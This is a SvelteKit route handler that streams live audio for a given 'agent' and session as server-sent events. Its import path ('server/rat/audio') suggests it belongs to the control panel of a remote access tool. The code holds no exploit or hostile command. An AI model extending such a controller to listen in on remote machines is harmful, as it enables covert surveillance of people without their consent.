import { error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { audioBridgeManager, AudioBridgeError } from '$lib/server/rat/audio';

export const GET: RequestHandler = ({ params, url, setHeaders }) => {
        const id = params.id;
        if (!id) {
                throw error(400, 'Missing agent identifier');
        }

        const sessionId = url.searchParams.get('sessionId');
        if (!sessionId) {
                throw error(400, 'Missing session identifier');
        }

        let stream: ReadableStream<Uint8Array>;
        try {
                stream = audioBridgeManager.subscribe(id, sessionId);
        } catch (err) {
                if (err instanceof AudioBridgeError) {
                        throw error(err.status, err.message);
                }
                throw error(500, 'Failed to subscribe to audio stream');
        }

        setHeaders({
                'Content-Type': 'text/event-stream',
                'Cache-Control': 'no-cache, no-transform',
                Connection: 'keep-alive'
        });

        return new Response(stream);
};
